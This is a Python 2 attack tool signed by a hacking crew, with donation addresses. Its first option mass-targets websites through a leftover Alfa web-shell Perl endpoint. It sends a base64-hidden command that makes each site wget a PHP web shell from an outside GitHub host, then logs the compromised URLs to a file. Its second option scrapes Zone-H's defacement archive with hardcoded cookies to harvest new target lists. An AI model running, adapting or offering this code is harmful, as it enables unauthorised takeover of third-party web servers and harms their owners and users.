#KONTOLATOSDDSS
#!/usr/bin/python
# -*- coding: utf-8 -*
#JametKNTLS - h0d3_g4n - Moslem - Jenderal92 -Kiddenta
# Blog : https://www.blog-gan.org          
#DONATE ME :(
	# BTC = 31mtLHqhaXXyCMnT2EU73U8fwYwigiEEU1
	# PERFECT MONEY  = U22270614
##############################
#####################################
import requests, re, urllib2, os, sys, codecs, random				
from multiprocessing.dummy import Pool					     	
from time import time as timer	
import time
import socket
import json				   		
from platform import system	
from random import sample
from colorama import Fore								
from colorama import Style								
from pprint import pprint								
from colorama import init
from urlparse import urlparse
import warnings
import subprocess
from requests.packages.urllib3.exceptions import InsecureRequestWarning
warnings.simplefilter('ignore',InsecureRequestWarning)
reload(sys)  
sys.setdefaultencoding('utf8')
init(autoreset=True)
##########################################################################################
##########################################################################################
abang = '\033[31m'
ijo = '\033[32m'
kuning = '\033[33m'
birtu = '\033[34m'
ungu = '\033[35m'
biru = '\033[36m'
abu = '\033[37m'
putih = '\033[0m' 
year = time.strftime("%y")
month = time.strftime("%m")
#####################################
##########################################################################################

def logo():
    clear = "\x1b[0m"
    colors = [36, 32, 34, 35, 31, 37]

    x = """
          \033[31m\   \033[31m/
   \033[34m----- (9\033[31m"-_-\033[34m)9  \033[37mVs  \033[34m6(\033[31mx_x"\033[34m6) -----
   
   \033[32m>--------------------------------<
   - Jamet Crew aka KNTL Megalodon - 
      - Alfa Perl RCE + Zone H Grabber - Jenderal92 -
   
   
   \033[41m\033[1;33m[Blog : https://www.blog-gan.org\033[0m
   \033[41m\033[1;33m[Online Tools : http://secpriv8.com\033[0m
   \033[41m\033[1;33m[ICQ : https://icq.im/Shin403\033[0m
   \033[32m>----------------------------------<
   [-] 1. ALFA.PERL RCE 
   [-] 2. ZONE-H GRABBER

   \033[32m>---------------------------------<  
   
"""
    for N, line in enumerate(x.split("\n")):
        sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
        time.sleep(0.05)


logo()

pilihmas = raw_input(':~# \033[34mChoose\033[32m Number : ')

########JANCOKSURAIMU####
def jancok(url):
	try:
		headers={
		'User-Agent': 'Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.210 Mobile Safari/537.36',
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'
		}
		path = ['/alfacgiapi/','/wordpress/alfacgiapi','/wp/alfacgiapi','/wp-content/alfacgiapi','/blog/alfacgiapi']
		for pathe in path:
			meks = requests.post(url +pathe+'/perl.alfa',data={'cmd': 'd2dldCAtTyBKQU5DT0sucGhwIGh0dHBzOi8vZ2l0aHViLmNvbS9hamliYXJhbmd4cGxvaXQvc2hpbi9yYXcvbWFzdGVyL3NoaW4ucGhw'}, headers=headers,timeout=15)
			mek = requests.get(url +pathe+'/JANCOK.php', headers=headers,timeout=8).content
			if "Ajibarang1337" in mek:
				print(kuning + '[FOUND --> ]'+ ijo + url + '/JANCOK.php')
				open('su.txt', 'a').write(url +pathe+'/JANCOK.php'+'\n')			
			else:
				print(kuning+'[ ASU --> ]' + abang + url )
			
	except:
		pass
	pass
			
def zh():
	try:
		NOTIFIER = raw_input("\033[91mEntre NOTIFIER: ")
		users = {'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'}
		kokies = {
		"ZHE" : "9e310eae93798bb9bef89a8f0f8e2785",
		"PHPSESSID" : "jqkf9r9u311d2b9eh46s556hu3"
		}
		for page in range(1, 51):
			urle = "http://www.zone-h.org/archive/notifier="+ NOTIFIER +"/page=" + str(page)
			zhne = requests.get(urle, headers=users, timeout=15, cookies=kokies).content
			if '<html><body>-<script type="text/javascript"' in zhne:
				print(abang+"Change Cookies Please")
				sys.exit()
			if'<input type="text" name="captcha" value=""><input type="submit">' in zhne:
				print(abang+"Entre Captcha In Zone-h From Ur Browser :/")
				sys.exit()
			if '/mirror/id/' in zhne:
				findool = re.findall('<td>(.*)\n							</td>', zhne)
				for zzh in findool:
					mek = zzh.replace('...','')
					print '    ['  + '*' + '] ' + mek.split('/')[0]
					open( NOTIFIER + '.txt', 'a').write("http://"+ mek.split('/')[0] + '\n')
				else:
					print("Grabb Sites Completed !!")
	except:
		pass
	
				
######MENGONTOL#####
def Main():
	try:
		if pilihmas =='1':
			list = raw_input("\n\033[91mGive Me List \033[97m:~# \033[97m")
			crownes = raw_input("\033[91mthread \033[97m\033[97m:~# \033[97m")
			rev1 = open(list, 'r').read().splitlines()
			pp = Pool(int(crownes))
			pr = pp.map(jancok, rev1)
		if pilihmas =='2':
			zh()
		
	except:
		pass

if __name__ == '__main__':
	Main()